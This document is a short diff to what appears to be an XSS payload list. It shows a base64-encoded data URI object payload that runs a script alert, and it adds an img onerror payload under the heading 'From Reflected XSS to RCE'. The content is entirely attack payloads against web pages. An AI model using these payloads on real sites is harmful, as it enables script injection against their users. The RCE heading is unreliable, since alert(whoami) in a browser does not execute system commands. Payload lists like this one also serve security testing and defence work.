@@ -162,3 +162,7 @@ xss payloads
 
 <object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
 
+
+# From Reflected XSS to RCE
+Payload: "><img src=x onerror=alert(whoami)>
+
